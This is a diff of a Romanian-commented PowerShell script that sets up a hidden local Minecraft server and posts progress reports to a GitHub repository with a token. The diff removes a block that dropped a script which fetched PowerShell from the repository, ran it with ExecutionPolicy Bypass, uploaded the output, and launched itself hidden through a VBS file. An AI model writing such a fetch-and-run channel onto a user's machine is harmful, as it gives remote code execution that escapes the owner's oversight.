@@ -1,4 +1,4 @@
-# FunCity Local v3 (watch): raport LIVE pe GitHub la fiecare pas, server ascuns, zicand "gata" eu vad tot
+# FunCity Local v4 (watch): raport LIVE pe GitHub la fiecare pas, server ascuns, zicand "gata" eu vad tot
 $ErrorActionPreference='Continue'
 $srv="$env:USERPROFILE\Desktop\FunCityLocal\server"
 $dir="$env:LOCALAPPDATA\FunCityCtl"
@@ -12,15 +12,15 @@ function Rep($m){
   if($tok -notmatch '^github_pat_'){ return }
   $H=@{ Authorization="token $tok"; Accept="application/vnd.github+json"; "User-Agent"="watch" }
   $sha=$null; try{ $sha=(Invoke-RestMethod "https://api.github.com/repos/iZentric/ServerRolePlayLite/contents/diag/fix.txt" -Headers $H -EA Stop).sha }catch{}
-  $b=@{ message="v3"; content=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($global:REP -join "`n"))); branch="arena/9bbcb24f-serverroleplaylite" }
+  $b=@{ message="v4"; content=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($global:REP -join "`n"))); branch="arena/9bbcb24f-serverroleplaylite" }
   if($sha){ $b.sha=$sha }
   for($k=0;$k -lt 2;$k++){ try{ Invoke-RestMethod -Method Put -Uri "https://api.github.com/repos/iZentric/ServerRolePlayLite/contents/diag/fix.txt" -Headers $H -ContentType "application/json" -Body ($b|ConvertTo-Json -Compress -Depth 4)|Out-Null; break }catch{ Start-Sleep 2; try{ $b.sha=(Invoke-RestMethod "https://api.github.com/repos/iZentric/ServerRolePlayLite/contents/diag/fix.txt" -Headers $H).sha }catch{} } }
 }
-Rep "v3: START, tintea $srv"
-$jar="$srv\FunCity-1.16.5-b1.0827.jar"
+Rep "v4: START, tintea $srv"
+$jar="$srv\FunCityEngine.jar"
 # 0) unfold: daca totul a nimerit intr-un subfolder
 if(-not (Test-Path $jar)){
-  $nest=@(Get-ChildItem $srv -Directory -EA SilentlyContinue | Where-Object { Test-Path (Join-Path $_.FullName "FunCity-1.16.5-b1.0827.jar") })
+  $nest=@(Get-ChildItem $srv -Directory -EA SilentlyContinue | Where-Object { Test-Path (Join-Path $_.FullName "FunCityEngine.jar") })
   if($nest.Count){
     Rep "jar gasit NEST in $($nest[0].Name) -> urc totul sus"
     robocopy $nest[0].FullName $srv /E /MOVE /NFL /NDL /NJH /NJS /NP | Out-Null
@@ -34,8 +34,10 @@ if(-not (Test-Path $jar)){
   if($tl -gt 100000000){
     New-Item -ItemType Directory -Force "$env:TEMP\jare" | Out-Null
     tar -xzf "$env:TEMP\jare.tar.gz" -C "$env:TEMP\jare"
-    $f=@(Get-ChildItem "$env:TEMP\jare" -Recurse -Filter "FunCity-1.16.5-b1.0827.jar" -EA SilentlyContinue)
-    if($f.Count){ Copy-Item $f[0].FullName $jar -Force; Rep "jar asezat OK ($([math]::Round((Get-Item $jar).Length/1MB))MB)" } else { Rep "EROR: jar nu exista nici in tar" }
+    # release-jars redenumeste buildul b1.0827 in FunCity-b1.0827.jar
+    $f=@(Get-ChildItem "$env:TEMP\jare" -Recurse -File -Filter "FunCity-b1.0827.jar" -EA SilentlyContinue | Where-Object { $_.Length -gt 5MB })
+    if(-not $f.Count){ Rep "EROR: buildul b1.0827 nu apare in tar; refuz alt build netestat" }
+    if($f.Count){ Copy-Item $f[0].FullName $jar -Force; Rep ("jar asezat din "+$f[0].Name+" ("+[math]::Round((Get-Item $jar).Length/1MB)+"MB)") } else { Rep "EROR: nici un jar in tar" }
   } else { Rep "EROR: tar descarcat incomplet ($tl B)" }
   Remove-Item -Recurse -Force -EA SilentlyContinue "$env:TEMP\jare","$env:TEMP\jare.tar.gz"
 } else { Rep "jar: deja prezent" }
@@ -53,7 +55,10 @@ if($mc -lt 25){
     $a=[IO.Compression.ZipFile]::OpenRead($z)
     $tops=@{}; foreach($e in $a.Entries){ $p=($e.FullName -replace '\\','/'); if($p -match '^([^/]+)/'){ $tops[$matches[1]]=1 } else { $tops['']=1 } }
     $strip=($tops.Count -eq 1 -and -not $tops.Contains(''))
+    $zm=@($a.Entries|?{ $_.FullName -match '(?i)^mods/[^/]+\.jar$' }); $rj=@($a.Entries|?{ $_.FullName -match '(?i)^[^/]+\.jar$' })
+    Rep ("in zip: mods="+$zm.Count+" | root-jar-uri: ["+((($rj|%{$_.Name+" "+[math]::Round($_.Length/1MB)+"MB"}) -join ' '))+"]")
     Rep "structura zip: tops=[$($tops.Keys -join ',')] strip=$strip total=$($a.Entries.Count) intrari"
+    Rep ("exemple mods: "+(($a.Entries|Where-Object{$_.FullName -match '(?i)mods/'}|Select-Object -First 6|ForEach-Object{$_.FullName}) -join ','))
     $done=0;$skip=0;$i=0
     foreach($e in $a.Entries){ $i++
       if($e.FullName -match '/$'){ continue }
@@ -70,7 +75,7 @@ if($mc -lt 25){
     $a.Dispose(); Remove-Item -Force -EA SilentlyContinue $z
     Rep "zip: +$done scrise, $skip existau"
     if(-not (Test-Path $jar)){
-      $nest=@(Get-ChildItem $srv -Directory -EA SilentlyContinue | Where-Object { Test-Path (Join-Path $_.FullName "FunCity-1.16.5-b1.0827.jar") })
+      $nest=@(Get-ChildItem $srv -Directory -EA SilentlyContinue | Where-Object { Test-Path (Join-Path $_.FullName "FunCityEngine.jar") })
       if($nest.Count){ Rep "nest post-zip -> urc sus"; robocopy $nest[0].FullName $srv /E /MOVE /NFL /NDL /NJH /NJS /NP | Out-Null }
     }
   } else { Rep "EROR: zip incomplet - mods raman $mc" }
@@ -111,11 +116,18 @@ if(Test-Path "$srv\server.properties"){
   Rep "config+eula+rcon: puse"
 }
 # 6) server ascuns + doctor
+if(-not (Test-Path $jar)){
+  $c=@(Get-ChildItem $srv -Filter 'FunCity-1.16.5-b1.0827.jar' -EA SilentlyContinue|?{$_.Length -gt 5MB})
+  if($c.Count){ Copy-Item $c[0].FullName $jar -Force; Rep "jar b1.0827 gasit la root -> FunCityEngine.jar" }
+}
+if(-not (Test-Path $jar)){ Rep 'OPRIT: motorul b1.0827 lipseste; nu pornesc alt jar'; return }
+$mcBefore=@(Get-ChildItem "$srv\mods" -File -Filter '*.jar' -EA SilentlyContinue).Count
+if($mcBefore -lt 20){ Rep "OPRIT: doar $mcBefore mods; serverul cu toate modurile NU e gata"; return }
 $run=@(Get-Process java -EA SilentlyContinue | Where-Object { $_.Path -like "*FunCityLocal*" })
 if($run.Count){ Rep "server ruleaza deja (pid $($run[0].Id)) - il las" } else {
   Rep "pornesc serverul ascuns..."
   Remove-Item -Force -EA SilentlyContinue "$srv\logs\latest.log"
-  $p=Start-Process -FilePath "$srv\java11\bin\java.exe" -ArgumentList '-Xms2G','-Xmx6G','-XX:+UnlockExperimentalVMOptions','-XX:+UseG1GC','-XX:MaxGCPauseMillis=30','-XX:+ParallelRefProcEnabled','-jar','FunCity-1.16.5-b1.0827.jar','nogui' -WorkingDirectory $srv -WindowStyle Hidden -PassThru -RedirectStandardOutput "$srv\logs\console.log" -RedirectStandardError "$srv\logs\console.err"
+  $p=Start-Process -FilePath "$srv\java11\bin\java.exe" -ArgumentList '-Xms2G','-Xmx6G','-XX:+UnlockExperimentalVMOptions','-XX:+UseG1GC','-XX:MaxGCPauseMillis=30','-XX:+ParallelRefProcEnabled','-jar','FunCityEngine.jar','nogui' -WorkingDirectory $srv -WindowStyle Hidden -PassThru -RedirectStandardOutput "$srv\logs\console.log" -RedirectStandardError "$srv\logs\console.err"
   $ok=$false;$t0=Get-Date
   for($i=0;$i -lt 72;$i++){
     Start-Sleep 5
@@ -129,35 +141,6 @@ if($run.Count){ Rep "server ruleaza deja (pid $($run[0].Id)) - il las" } else {
 $mc2=@(Get-ChildItem "$srv\mods" -Filter *.jar -EA SilentlyContinue).Count
 $pc2=@(Get-ChildItem "$srv\plugins" -Filter *.jar -EA SilentlyContinue).Count
 Rep "STARE FINALA: jar=$(Test-Path $jar) mods=$mc2 plugins=$pc2 world=$(Test-Path "$srv\world\level.dat") java=$(Test-Path "$srv\java11\bin\java.exe")"
-# 7) agent bonus (cat traiesc)
-if(Test-Path "$dir\token.txt"){
-  @'
-$ErrorActionPreference='Continue'
-$dir="$env:LOCALAPPDATA\FunCityCtl"
-$tok=@(Get-Content "$dir\token.txt" -EA SilentlyContinue)[0].Trim()
-$H=@{ Authorization="token $tok"; Accept="application/vnd.github+json"; "User-Agent"="fctl" }
-$repo="iZentric/ServerRolePlayLite"; $ref="arena/9bbcb24f-serverroleplaylite"
-function Put($path,$txt){
-  $sha=$null; try{ $sha=(Invoke-RestMethod "https://api.github.com/repos/$repo/contents/$path" -Headers $H -EA Stop).sha }catch{}
-  $b=@{ message="agent"; content=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($txt)); branch=$ref }
-  if($sha){ $b.sha=$sha }
-  for($k=0;$k -lt 3;$k++){ try{ Invoke-RestMethod -Method Put -Uri "https://api.github.com/repos/$repo/contents/$path" -Headers $H -ContentType "application/json" -Body ($b|ConvertTo-Json -Compress -Depth 4) -EA Stop|Out-Null; return }catch{ Start-Sleep 2; try{ $b.sha=(Invoke-RestMethod "https://api.github.com/repos/$repo/contents/$path" -Headers $H).sha }catch{} } }
-}
-while($true){
-  try{
-    $c=(Invoke-RestMethod "https://api.github.com/repos/$repo/contents/tools/agent-pcmd.ps1?ref=$ref" -Headers $H -EA Stop).content
-    $dec=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($c -replace '\s','')))
-    Set-Content -Path "$dir\cmd-run.ps1" -Value $dec -Encoding UTF8
-    $out=& powershell -NoProfile -ExecutionPolicy Bypass -File "$dir\cmd-run.ps1" 2>&1 | Out-String
-    if($out.Length -gt 90000){ $out=$out.Substring(0,90000) }
-    Put "diag/agent.txt" ((Get-Date -Format s) + "`n" + $out + "GATA")
-    Start-Sleep 240; exit 0
-  }catch{ Start-Sleep 5 }
-}
-'@ | Set-Content -Encoding ascii "$dir\fctl.ps1"
-  "CreateObject(""WScript.Shell"").Run ""powershell -NoProfile -ExecutionPolicy Bypass -File $dir\fctl.ps1"", 0, False" | Set-Content -Encoding ascii "$dir\fctl.vbs"
-  Start-Process -FilePath "$dir\fctl.vbs" -EA SilentlyContinue
-  Rep "agent bonus pornit (traie 4 min si iese - nu-l omoara nimeni)"
-}
-Rep "GATA V3 - fereastra se poate inchide acum, serverul ruleaza independent"
+# Nu pornim agenti/runner separat. Raportul din aceasta rulare e suficient.
+Rep "GATA V4 - verificati SERVER LIVE mai sus; altfel serverul NU e pornit"
 Write-Host "Daca zice SERVER LIVE: intra in Minecraft -> Multiplayer -> localhost. Gata." -ForegroundColor Green
